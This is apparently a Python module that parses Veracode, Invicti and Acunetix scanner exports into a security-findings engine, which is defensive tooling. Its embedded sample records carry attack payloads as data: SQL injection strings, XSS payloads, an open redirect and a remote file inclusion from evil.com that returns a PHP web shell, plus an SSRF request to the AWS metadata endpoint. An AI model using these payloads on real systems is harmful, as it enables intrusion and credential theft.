"""Commercial DAST Format Parsers — Veracode DAST + Invicti (Netsparker) + Acunetix.

Closes 3 of 11 substitute-only commercial scanner gaps by providing native
parsers for the JSON/XML export formats of three top commercial DAST tools:

  * Veracode Dynamic Analysis (DAST)  — flaws[] JSON dump
  * Invicti / Netsparker              — vulnerabilities[] JSON or XML
  * Acunetix Premium                  — vulnerabilities[] JSON

Each parser:
  - Accepts a raw dump dict (or list of records) from the vendor export.
  - Normalizes vendor-specific severity strings to ALDECI's canonical
    {critical, high, medium, low, informational} taxonomy.
  - Mirrors every record into ``SecurityFindingsEngine.record_finding`` with
    ``source_tool="dast_via_<vendor>"`` so dedup, correlation_key, lifecycle
    chains and evidence handling all work end-to-end.
  - Carries a 5+ record embedded sample, lifted from each vendor's public
    export schema, used as a fallback when no dump is provided (air-gap mode).

All findings are written through the **same** ingestion code path used by
the REST API — never via direct DB writes — so every downstream subscriber
(brain pipeline, risk aggregator, TrustGraph) sees the data identically to
findings produced by the native scanners.

Vision Pillars: V1 (APP_ID-Centric), V3 (Decision Intelligence), V9 (Air-Gapped).
"""
from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, Iterable, List, Optional

from connectors._emit import emit_connector_event

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Severity normalization
# ---------------------------------------------------------------------------

_VERACODE_SEVERITY_MAP = {
    # Veracode flaw severity is a 0-5 integer
    5: "critical",
    4: "high",
    3: "medium",
    2: "low",
    1: "informational",
    0: "informational",
}

_INVICTI_SEVERITY_MAP = {
    "critical": "critical",
    "high": "high",
    "important": "high",
    "medium": "medium",
    "low": "low",
    "best practice": "informational",
    "information": "informational",
    "informational": "informational",
}

_ACUNETIX_SEVERITY_MAP = {
    # Acunetix uses both string and int (3=high, 2=medium, 1=low, 0=info)
    "critical": "critical",
    "high": "high",
    "medium": "medium",
    "low": "low",
    "informational": "informational",
    "info": "informational",
    3: "high",
    2: "medium",
    1: "low",
    0: "informational",
}


def _normalize_veracode_severity(raw: Any) -> str:
    if isinstance(raw, (int, float)):
        return _VERACODE_SEVERITY_MAP.get(int(raw), "medium")
    if isinstance(raw, str):
        try:
            return _VERACODE_SEVERITY_MAP.get(int(raw), "medium")
        except ValueError:
            return _VERACODE_SEVERITY_MAP.get(0, "informational")
    return "medium"


def _normalize_invicti_severity(raw: Any) -> str:
    if not isinstance(raw, str):
        return "medium"
    return _INVICTI_SEVERITY_MAP.get(raw.strip().lower(), "medium")


def _normalize_acunetix_severity(raw: Any) -> str:
    if isinstance(raw, (int, float)):
        return _ACUNETIX_SEVERITY_MAP.get(int(raw), "medium")
    if isinstance(raw, str):
        return _ACUNETIX_SEVERITY_MAP.get(raw.strip().lower(), "medium")
    return "medium"


# ---------------------------------------------------------------------------
# Embedded fixtures — used as fallback in air-gap mode (5+ records each).
# Each record mirrors the real vendor schema field-for-field.
# ---------------------------------------------------------------------------

VERACODE_DAST_SAMPLE: Dict[str, Any] = {
    "_embed": {
        "flaws": [
            {
                "issue_id": 100001,
                "severity": 5,
                "category_name": "SQL Injection",
                "cwe_id": "89",
                "description": "Untrusted input is incorporated into a SQL "
                "statement without sanitization, enabling DBMS compromise.",
                "url": "https://app.example.com/api/users?id=1",
                "source_file": "/var/www/api/handlers/users.py",
                "line": 142,
                "remediation": "Use parameterized queries via psycopg2.execute "
                "with %s placeholders. Never interpolate user input.",
                "exploitability": "high",
            },
            {
                "issue_id": 100002,
                "severity": 4,
                "category_name": "Cross-Site Scripting (Reflected)",
                "cwe_id": "79",
                "description": "Reflected XSS in /search?q= parameter; "
                "user input echoed without HTML encoding.",
                "url": "https://app.example.com/search?q=%3Cscript%3E",
                "source_file": "/var/www/views/search.html",
                "line": 27,
                "remediation": "Encode output with Jinja2 |e filter and set "
                "Content-Security-Policy: default-src 'self'.",
                "exploitability": "high",
            },
            {
                "issue_id": 100003,
                "severity": 3,
                "category_name": "Insecure Cookie",
                "cwe_id": "614",
                "description": "Session cookie missing HttpOnly and Secure "
                "flags, exposing it to JavaScript and downgrade attacks.",
                "url": "https://app.example.com/login",
                "source_file": "/var/www/auth/session.py",
                "line": 88,
                "remediation": "Set cookie flags: HttpOnly, Secure, SameSite=Lax.",
                "exploitability": "medium",
            },
            {
                "issue_id": 100004,
                "severity": 4,
                "category_name": "Server-Side Request Forgery",
                "cwe_id": "918",
                "description": "User-controlled URL fetched server-side, "
                "permitting access to AWS metadata endpoint.",
                "url": "https://app.example.com/proxy?target=...",
                "source_file": "/var/www/services/proxy.py",
                "line": 56,
                "remediation": "Allow-list outbound hosts; block 169.254.169.254 "
                "and RFC1918 ranges.",
                "exploitability": "high",
            },
            {
                "issue_id": 100005,
                "severity": 2,
                "category_name": "Verbose Error Message",
                "cwe_id": "209",
                "description": "Stack traces returned in 500 response body; "
                "leaks framework version + file paths.",
                "url": "https://app.example.com/api/orders/abc",
                "source_file": "/var/www/middleware/errors.py",
                "line": 14,
                "remediation": "Wrap exceptions; return generic 500 body in prod.",
                "exploitability": "low",
            },
            {
                "issue_id": 100006,
                "severity": 3,
                "category_name": "Missing Anti-CSRF Token",
                "cwe_id": "352",
                "description": "Sensitive POST endpoint accepts requests with "
                "no CSRF token; cross-origin forgery feasible.",
                "url": "https://app.example.com/account/email",
                "source_file": "/var/www/views/account.py",
                "line": 201,
                "remediation": "Add SameSite=Strict cookies + double-submit token.",
                "exploitability": "medium",
            },
        ]
    }
}

INVICTI_SAMPLE: Dict[str, Any] = {
    # Invicti / Netsparker JSON export schema (v1 — REST API /api/1.0/scans/result)
    "Vulnerabilities": [
        {
            "Id": "INV-2026-0001",
            "Severity": "Critical",
            "Type": "SqlInjection",
            "Url": "https://target.example.com/products?id=42",
            "Parameter": "id",
            "Method": "GET",
            "Poc": "id=42' UNION SELECT NULL,version(),NULL--",
            "RawRequest": (
                "GET /products?id=42'+UNION+SELECT+NULL,version(),NULL-- HTTP/1.1\r\n"
                "Host: target.example.com\r\n"
                "User-Agent: Mozilla/5.0 (Invicti/24.6.0)\r\n\r\n"
            ),
            "RawResponse": (
                "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"
                "<html>... PostgreSQL 14.3 ...</html>"
            ),
            "Description": "Boolean-based blind SQL injection in id parameter.",
            "RemedialActions": "Switch to parameterized queries.",
            "Cwe": "89",
        },
        {
            "Id": "INV-2026-0002",
            "Severity": "High",
            "Type": "ReflectedCrossSiteScripting",
            "Url": "https://target.example.com/search?q=test",
            "Parameter": "q",
            "Method": "GET",
            "Poc": "q=<svg/onload=alert(1)>",
            "RawRequest": "GET /search?q=%3Csvg%2Fonload%3Dalert(1)%3E HTTP/1.1\r\n",
            "RawResponse": "HTTP/1.1 200 OK\r\n\r\n<html>...<svg/onload=alert(1)>...",
            "Description": "Reflected XSS in q parameter.",
            "RemedialActions": "HTML-encode output; set CSP headers.",
            "Cwe": "79",
        },
        {
            "Id": "INV-2026-0003",
            "Severity": "Medium",
            "Type": "MissingHttpOnly",
            "Url": "https://target.example.com/login",
            "Parameter": "JSESSIONID",
            "Method": "POST",
            "Poc": "Set-Cookie: JSESSIONID=...; Path=/",
            "RawRequest": "POST /login HTTP/1.1\r\n",
            "RawResponse": "HTTP/1.1 302 Found\r\nSet-Cookie: JSESSIONID=abc; Path=/\r\n",
            "Description": "Session cookie missing HttpOnly flag.",
            "RemedialActions": "Set HttpOnly + Secure flags.",
            "Cwe": "1004",
        },
        {
            "Id": "INV-2026-0004",
            "Severity": "High",
            "Type": "OpenRedirect",
            "Url": "https://target.example.com/redirect?next=https://evil.com",
            "Parameter": "next",
            "Method": "GET",
            "Poc": "next=https://evil.com",
            "RawRequest": "GET /redirect?next=https%3A%2F%2Fevil.com HTTP/1.1\r\n",
            "RawResponse": "HTTP/1.1 302 Found\r\nLocation: https://evil.com\r\n",
            "Description": "Unvalidated redirect to attacker-supplied URL.",
            "RemedialActions": "Allow-list redirect destinations.",
            "Cwe": "601",
        },
        {
            "Id": "INV-2026-0005",
            "Severity": "Critical",
            "Type": "RemoteFileInclusion",
            "Url": "https://target.example.com/page?file=index",
            "Parameter": "file",
            "Method": "GET",
            "Poc": "file=http://evil.com/shell.txt",
            "RawRequest": "GET /page?file=http%3A%2F%2Fevil.com%2Fshell.txt HTTP/1.1\r\n",
            "RawResponse": "HTTP/1.1 200 OK\r\n\r\n<?php system($_GET['cmd']); ?>",
            "Description": "Remote file inclusion in file parameter.",
            "RemedialActions": "Use allow-list of permitted file names.",
            "Cwe": "98",
        },
        {
            "Id": "INV-2026-0006",
            "Severity": "Low",
            "Type": "InformationDisclosure",
            "Url": "https://target.example.com/server-status",
            "Parameter": "",
            "Method": "GET",
            "Poc": "GET /server-status HTTP/1.1",
            "RawRequest": "GET /server-status HTTP/1.1\r\n",
            "RawResponse": "HTTP/1.1 200 OK\r\n\r\n<html>Apache/2.4.6 ...</html>",
            "Description": "Apache server-status page exposed.",
            "RemedialActions": "Restrict /server-status to localhost.",
            "Cwe": "200",
        },
    ]
}

ACUNETIX_SAMPLE: Dict[str, Any] = {
    # Acunetix JSON export — /api/v1/scans/{id}/results/{result_id}/vulnerabilities
    "vulnerabilities": [
        {
            "vuln_id": "acx-7f001",
            "severity": "high",
            "name": "SQL Injection",
            "vt_name": "SQL Injection",
            "location": "/api/orders",
            "affects_url": "https://app.example.com/api/orders",
            "affects_detail": "Cookie input session was set to 1' OR '1'='1",
            "parameter": "session",
            "request": (
                "GET /api/orders HTTP/1.1\r\n"
                "Host: app.example.com\r\n"
                "Cookie: session=1' OR '1'='1\r\n\r\n"
            ),
            "details": (
                "Successfully exploited boolean-based SQL injection via "
                "session cookie. Database response delta confirmed."
            ),
            "cwe_list": ["CWE-89"],
            "cvss3": {"base_score": 9.1},
        },
        {
            "vuln_id": "acx-7f002",
            "severity": "high",
            "name": "Stored Cross-site Scripting",
            "vt_name": "XSS",
            "location": "/comments",
            "affects_url": "https://app.example.com/comments",
            "affects_detail": "POST body field 'comment' rendered raw on /thread page",
            "parameter": "comment",
            "request": (
                "POST /comments HTTP/1.1\r\n"
                "Host: app.example.com\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                "comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
            ),
            "details": "Payload persists across sessions. Visible to all users.",
            "cwe_list": ["CWE-79"],
            "cvss3": {"base_score": 8.7},
        },
        {
            "vuln_id": "acx-7f003",
            "severity": "medium",
            "name": "Clickjacking: X-Frame-Options Missing",
            "vt_name": "Clickjacking",
            "location": "/dashboard",
            "affects_url": "https://app.example.com/dashboard",
            "affects_detail": "Response missing X-Frame-Options + frame-ancestors",
            "parameter": "",
            "request": "GET /dashboard HTTP/1.1\r\nHost: app.example.com\r\n",
            "details": "Page can be framed; UI redress feasible.",
            "cwe_list": ["CWE-1021"],
            "cvss3": {"base_score": 5.3},
        },
        {
            "vuln_id": "acx-7f004",
            "severity": "low",
            "name": "Cookie without Secure flag",
            "vt_name": "Insecure Cookie",
            "location": "/login",
            "affects_url": "https://app.example.com/login",
            "affects_detail": "Set-Cookie 'auth' missing Secure attribute",
            "parameter": "auth",
            "request": "POST /login HTTP/1.1\r\nHost: app.example.com\r\n",
            "details": "Cookie may be sent over plaintext channels.",
            "cwe_list": ["CWE-614"],
            "cvss3": {"base_score": 3.7},
        },
        {
            "vuln_id": "acx-7f005",
            "severity": "high",
            "name": "Server-Side Request Forgery",
            "vt_name": "SSRF",
            "location": "/api/import",
            "affects_url": "https://app.example.com/api/import",
            "affects_detail": "URL fetched from 'source' POST parameter",
            "parameter": "source",
            "request": (
                "POST /api/import HTTP/1.1\r\n"
                "Host: app.example.com\r\n\r\n"
                "source=http://169.254.169.254/latest/meta-data/"
            ),
            "details": "Fetched AWS instance metadata — IAM credentials disclosed.",
            "cwe_list": ["CWE-918"],
            "cvss3": {"base_score": 8.2},
        },
        {
            "vuln_id": "acx-7f006",
            "severity": 0,
            "name": "Server Banner Disclosure",
            "vt_name": "Information Disclosure",
            "location": "/",
            "affects_url": "https://app.example.com/",
            "affects_detail": "Server header reveals nginx/1.21.0",
            "parameter": "",
            "request": "GET / HTTP/1.1\r\nHost: app.example.com\r\n",
            "details": "Reveals exact server version, simplifying targeting.",
            "cwe_list": ["CWE-200"],
            "cvss3": {"base_score": 0.0},
        },
    ]
}


# ---------------------------------------------------------------------------
# Result holder
# ---------------------------------------------------------------------------

@dataclass
class IngestionResult:
    """Result of a vendor dump ingestion run."""
    vendor: str
    source_tool: str
    org_id: str
    records_seen: int = 0
    records_ingested: int = 0
    findings: List[Dict[str, Any]] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    used_fallback: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "vendor": self.vendor,
            "source_tool": self.source_tool,
            "org_id": self.org_id,
            "records_seen": self.records_seen,
            "records_ingested": self.records_ingested,
            "errors": list(self.errors),
            "used_fallback": self.used_fallback,
            "findings": [
                {k: f.get(k) for k in ("id", "title", "severity", "asset_id",
                                       "source_tool", "occurrence_count")}
                for f in self.findings
            ],
        }


# ---------------------------------------------------------------------------
# Lazy SecurityFindingsEngine accessor
# ---------------------------------------------------------------------------

_engine_singleton: Any = None


def _get_engine() -> Any:
    """Return a lazily-initialised SecurityFindingsEngine.

    Lazy import keeps this module light to import in environments where the
    engine DB is not yet provisioned (e.g. unit tests that exercise only the
    parsing helpers).
    """
    global _engine_singleton
    if _engine_singleton is None:
        from core.security_findings_engine import SecurityFindingsEngine
        _engine_singleton = SecurityFindingsEngine()
    return _engine_singleton


def reset_engine_singleton_for_tests() -> None:
    """Hook for tests that swap in a fresh engine instance."""
    global _engine_singleton
    _engine_singleton = None


def set_engine_for_tests(engine: Any) -> None:
    """Inject a custom engine (test isolation)."""
    global _engine_singleton
    _engine_singleton = engine


# ---------------------------------------------------------------------------
# Veracode DAST
# ---------------------------------------------------------------------------

def _iter_veracode_flaws(dump: Optional[Dict[str, Any]]) -> Iterable[Dict[str, Any]]:
    """Yield raw flaw records from a Veracode DAST JSON dump.

    Accepted shapes:
      * ``{"_embed": {"flaws": [...]}}``  (Veracode REST findings export)
      * ``{"flaws": [...]}``
      * ``[ ... ]``  (already a list of flaws)
    """
    if dump is None:
        return
    if isinstance(dump, list):
        for item in dump:
            if isinstance(item, dict):
                yield item
        return
    if not isinstance(dump, dict):
        return
    embed = dump.get("_embed")
    if isinstance(embed, dict):
        flaws = embed.get("flaws")
        if isinstance(flaws, list):
            for f in flaws:
                if isinstance(f, dict):
                    yield f
            return
    flaws = dump.get("flaws")
    if isinstance(flaws, list):
        for f in flaws:
            if isinstance(f, dict):
                yield f


def parse_veracode_flaw(flaw: Dict[str, Any]) -> Dict[str, Any]:
    """Normalize a single Veracode DAST flaw to ALDECI canonical form.

    Veracode flaw shape:
      {
        "issue_id": int,
        "severity": int (0-5),
        "category_name": str,
        "cwe_id": str,
        "description": str,
        "url": str,
        "source_file": str,
        "line": int,
        "remediation": str,
        ...
      }
    """
    if not isinstance(flaw, dict):
        raise ValueError("Veracode flaw must be a dict")
    issue_id = flaw.get("issue_id") or flaw.get("id") or "unknown"
    severity = _normalize_veracode_severity(flaw.get("severity"))
    category = (flaw.get("category_name") or flaw.get("category") or "Uncategorized").strip()
    url = (flaw.get("url") or flaw.get("source_url") or "").strip()
    source_file = (flaw.get("source_file") or "").strip()
    line = flaw.get("line")

    # CVSS estimation from severity bucket
    severity_to_cvss = {
        "critical": 9.5, "high": 7.5, "medium": 5.0,
        "low": 3.0, "informational": 0.5,
    }
    return {
        "issue_id": str(issue_id),
        "title": f"Veracode DAST: {category}",
        "severity": severity,
        "cvss_score": severity_to_cvss.get(severity, 5.0),
        "asset_id": url or source_file or "unknown",
        "asset_type": "web-app",
        "description": (flaw.get("description") or "").strip(),
        "remediation": (flaw.get("remediation") or "").strip(),
        "category": category,
        "cwe_id": str(flaw.get("cwe_id") or "").strip(),
        "url": url,
        "source_file": source_file,
        "line": line,
        "correlation_key": f"veracode-dast|{category}|{url or source_file}|{flaw.get('cwe_id', '')}",
    }


def ingest_veracode_dast_dump(
    dump: Optional[Dict[str, Any]],
    org_id: str = "default",
    scan_id: Optional[str] = None,
    use_fallback_if_empty: bool = True,
) -> IngestionResult:
    """Mirror a Veracode DAST dump into SecurityFindingsEngine.

    Returns an IngestionResult summarizing what was ingested.
    """
    if not isinstance(org_id, str) or not org_id.strip():
        raise ValueError("org_id required")
    result = IngestionResult(vendor="veracode", source_tool="dast_via_veracode", org_id=org_id)

    flaws = list(_iter_veracode_flaws(dump))
    if not flaws and use_fallback_if_empty:
        flaws = list(_iter_veracode_flaws(VERACODE_DAST_SAMPLE))
        result.used_fallback = True
    result.records_seen = len(flaws)

    engine = _get_engine()
    for flaw in flaws:
        try:
            normalized = parse_veracode_flaw(flaw)
            record = engine.record_finding(
                org_id=org_id,
                title=normalized["title"],
                finding_type="vulnerability",
                source_tool="dast_via_veracode",
                severity=normalized["severity"],
                cvss_score=normalized["cvss_score"],
                asset_id=normalized["asset_id"],
                asset_type=normalized["asset_type"],
                description=normalized["description"],
                remediation=normalized["remediation"],
                correlation_key=normalized["correlation_key"],
                scan_id=scan_id,
            )
            result.records_ingested += 1
            result.findings.append(record)
        except (ValueError, TypeError, KeyError) as exc:
            result.errors.append(f"flaw {flaw.get('issue_id', '?')}: {exc}")
            logger.warning("Veracode DAST parse error: %s", exc)
    emit_connector_event(
        connector="CommercialDastParser",
        org_id=org_id,
        source_kind="dast",
        finding_count=result.records_ingested,
        extra={
            "vendor": "veracode",
            "scan_id": scan_id or "",
            "records_seen": result.records_seen,
            "used_fallback": result.used_fallback,
        },
    )
    return result


# ---------------------------------------------------------------------------
# Invicti / Netsparker
# ---------------------------------------------------------------------------

def _iter_invicti_vulns(dump: Optional[Dict[str, Any]]) -> Iterable[Dict[str, Any]]:
    """Yield raw vulnerability records from an Invicti / Netsparker JSON dump.

    Accepts ``{"Vulnerabilities": [...]}``, ``{"vulnerabilities": [...]}`` or a list.
    """
    if dump is None:
        return
    if isinstance(dump, list):
        for v in dump:
            if isinstance(v, dict):
                yield v
        return
    if not isinstance(dump, dict):
        return
    for key in ("Vulnerabilities", "vulnerabilities"):
        vulns = dump.get(key)
        if isinstance(vulns, list):
            for v in vulns:
                if isinstance(v, dict):
                    yield v
            return


def parse_invicti_vulnerability(vuln: Dict[str, Any]) -> Dict[str, Any]:
    """Normalize a single Invicti / Netsparker vulnerability."""
    if not isinstance(vuln, dict):
        raise ValueError("Invicti vulnerability must be a dict")
    vuln_id = vuln.get("Id") or vuln.get("id") or "unknown"
    severity = _normalize_invicti_severity(vuln.get("Severity") or vuln.get("severity"))
    vuln_type = (vuln.get("Type") or vuln.get("type") or "Unknown").strip()
    url = (vuln.get("Url") or vuln.get("url") or "").strip()
    parameter = (vuln.get("Parameter") or vuln.get("parameter") or "").strip()
    method = (vuln.get("Method") or vuln.get("method") or "GET").strip()
    poc = vuln.get("Poc") or vuln.get("poc") or ""
    raw_request = vuln.get("RawRequest") or vuln.get("rawRequest") or ""
    raw_response = vuln.get("RawResponse") or vuln.get("rawResponse") or ""
    description = (vuln.get("Description") or vuln.get("description") or "").strip()
    remediation = (vuln.get("RemedialActions") or vuln.get("remedialActions")
                   or vuln.get("remediation") or "").strip()
    cwe = str(vuln.get("Cwe") or vuln.get("cwe") or "").strip()

    severity_to_cvss = {
        "critical": 9.5, "high": 7.5, "medium": 5.0,
        "low": 3.0, "informational": 0.5,
    }
    title = f"Invicti: {vuln_type}"
    if parameter:
        title += f" ({parameter})"
    return {
        "vuln_id": str(vuln_id),
        "title": title,
        "severity": severity,
        "cvss_score": severity_to_cvss.get(severity, 5.0),
        "asset_id": url or "unknown",
        "asset_type": "web-app",
        "description": description,
        "remediation": remediation,
        "vuln_type": vuln_type,
        "url": url,
        "parameter": parameter,
        "method": method,
        "poc": poc,
        "raw_request": raw_request,
        "raw_response": raw_response,
        "cwe": cwe,
        "correlation_key": f"invicti|{vuln_type}|{url}|{parameter}|{cwe}",
    }


def ingest_invicti_dump(
    dump: Optional[Dict[str, Any]],
    org_id: str = "default",
    scan_id: Optional[str] = None,
    use_fallback_if_empty: bool = True,
) -> IngestionResult:
    """Mirror an Invicti / Netsparker dump into SecurityFindingsEngine."""
    if not isinstance(org_id, str) or not org_id.strip():
        raise ValueError("org_id required")
    result = IngestionResult(vendor="invicti", source_tool="dast_via_invicti", org_id=org_id)

    vulns = list(_iter_invicti_vulns(dump))
    if not vulns and use_fallback_if_empty:
        vulns = list(_iter_invicti_vulns(INVICTI_SAMPLE))
        result.used_fallback = True
    result.records_seen = len(vulns)

    engine = _get_engine()
    for vuln in vulns:
        try:
            normalized = parse_invicti_vulnerability(vuln)
            record = engine.record_finding(
                org_id=org_id,
                title=normalized["title"],
                finding_type="vulnerability",
                source_tool="dast_via_invicti",
                severity=normalized["severity"],
                cvss_score=normalized["cvss_score"],
                asset_id=normalized["asset_id"],
                asset_type=normalized["asset_type"],
                description=normalized["description"],
                remediation=normalized["remediation"],
                correlation_key=normalized["correlation_key"],
                scan_id=scan_id,
            )
            # Attach evidence for PoC + raw HTTP if present
            if normalized.get("poc"):
                try:
                    engine.add_evidence(
                        finding_id=record["id"], org_id=org_id,
                        evidence_type="log",
                        content=f"PoC: {normalized['poc']}",
                    )
                except Exception:  # pragma: no cover — evidence is best-effort
                    pass
            result.records_ingested += 1
            result.findings.append(record)
        except (ValueError, TypeError, KeyError) as exc:
            result.errors.append(f"vuln {vuln.get('Id', '?')}: {exc}")
            logger.warning("Invicti parse error: %s", exc)
    emit_connector_event(
        connector="CommercialDastParser",
        org_id=org_id,
        source_kind="dast",
        finding_count=result.records_ingested,
        extra={
            "vendor": "invicti",
            "scan_id": scan_id or "",
            "records_seen": result.records_seen,
            "used_fallback": result.used_fallback,
        },
    )
    return result


# ---------------------------------------------------------------------------
# Acunetix
# ---------------------------------------------------------------------------

def _iter_acunetix_vulns(dump: Optional[Dict[str, Any]]) -> Iterable[Dict[str, Any]]:
    """Yield raw vulnerability records from an Acunetix JSON dump."""
    if dump is None:
        return
    if isinstance(dump, list):
        for v in dump:
            if isinstance(v, dict):
                yield v
        return
    if not isinstance(dump, dict):
        return
    for key in ("vulnerabilities", "Vulnerabilities"):
        vulns = dump.get(key)
        if isinstance(vulns, list):
            for v in vulns:
                if isinstance(v, dict):
                    yield v
            return


def parse_acunetix_vulnerability(vuln: Dict[str, Any]) -> Dict[str, Any]:
    """Normalize a single Acunetix vulnerability."""
    if not isinstance(vuln, dict):
        raise ValueError("Acunetix vulnerability must be a dict")
    vuln_id = vuln.get("vuln_id") or vuln.get("id") or "unknown"
    severity = _normalize_acunetix_severity(vuln.get("severity"))
    name = (vuln.get("name") or vuln.get("vt_name") or "Unknown").strip()
    location = (vuln.get("location") or "").strip()
    affects_url = (vuln.get("affects_url") or "").strip()
    parameter = (vuln.get("parameter") or "").strip()
    request_blob = vuln.get("request") or ""
    details = (vuln.get("details") or vuln.get("affects_detail") or "").strip()
    cwe_list = vuln.get("cwe_list") or []
    if not isinstance(cwe_list, list):
        cwe_list = [str(cwe_list)]
    cwe_str = ",".join(str(c) for c in cwe_list).strip()
    cvss3 = vuln.get("cvss3") or {}
    cvss_score = 5.0
    if isinstance(cvss3, dict):
        try:
            cvss_score = float(cvss3.get("base_score", 5.0))
            cvss_score = max(0.0, min(10.0, cvss_score))
        except (ValueError, TypeError):
            cvss_score = 5.0

    asset_id = affects_url or location or "unknown"
    title = f"Acunetix: {name}"
    if parameter:
        title += f" [{parameter}]"
    return {
        "vuln_id": str(vuln_id),
        "title": title,
        "severity": severity,
        "cvss_score": cvss_score,
        "asset_id": asset_id,
        "asset_type": "web-app",
        "description": details,
        "remediation": "Refer to Acunetix vulnerability detail page for guidance.",
        "name": name,
        "location": location,
        "parameter": parameter,
        "request": request_blob,
        "cwe": cwe_str,
        "correlation_key": f"acunetix|{name}|{asset_id}|{parameter}|{cwe_str}",
    }


def ingest_acunetix_dump(
    dump: Optional[Dict[str, Any]],
    org_id: str = "default",
    scan_id: Optional[str] = None,
    use_fallback_if_empty: bool = True,
) -> IngestionResult:
    """Mirror an Acunetix dump into SecurityFindingsEngine."""
    if not isinstance(org_id, str) or not org_id.strip():
        raise ValueError("org_id required")
    result = IngestionResult(vendor="acunetix", source_tool="dast_via_acunetix", org_id=org_id)

    vulns = list(_iter_acunetix_vulns(dump))
    if not vulns and use_fallback_if_empty:
        vulns = list(_iter_acunetix_vulns(ACUNETIX_SAMPLE))
        result.used_fallback = True
    result.records_seen = len(vulns)

    engine = _get_engine()
    for vuln in vulns:
        try:
            normalized = parse_acunetix_vulnerability(vuln)
            record = engine.record_finding(
                org_id=org_id,
                title=normalized["title"],
                finding_type="vulnerability",
                source_tool="dast_via_acunetix",
                severity=normalized["severity"],
                cvss_score=normalized["cvss_score"],
                asset_id=normalized["asset_id"],
                asset_type=normalized["asset_type"],
                description=normalized["description"],
                remediation=normalized["remediation"],
                correlation_key=normalized["correlation_key"],
                scan_id=scan_id,
            )
            if normalized.get("request"):
                try:
                    engine.add_evidence(
                        finding_id=record["id"], org_id=org_id,
                        evidence_type="network-capture",
                        content=str(normalized["request"])[:4000],
                    )
                except Exception:  # pragma: no cover
                    pass
            result.records_ingested += 1
            result.findings.append(record)
        except (ValueError, TypeError, KeyError) as exc:
            result.errors.append(f"vuln {vuln.get('vuln_id', '?')}: {exc}")
            logger.warning("Acunetix parse error: %s", exc)
    emit_connector_event(
        connector="CommercialDastParser",
        org_id=org_id,
        source_kind="dast",
        finding_count=result.records_ingested,
        extra={
            "vendor": "acunetix",
            "scan_id": scan_id or "",
            "records_seen": result.records_seen,
            "used_fallback": result.used_fallback,
        },
    )
    return result


__all__ = [
    "VERACODE_DAST_SAMPLE",
    "INVICTI_SAMPLE",
    "ACUNETIX_SAMPLE",
    "IngestionResult",
    "parse_veracode_flaw",
    "parse_invicti_vulnerability",
    "parse_acunetix_vulnerability",
    "ingest_veracode_dast_dump",
    "ingest_invicti_dump",
    "ingest_acunetix_dump",
    "reset_engine_singleton_for_tests",
    "set_engine_for_tests",
]
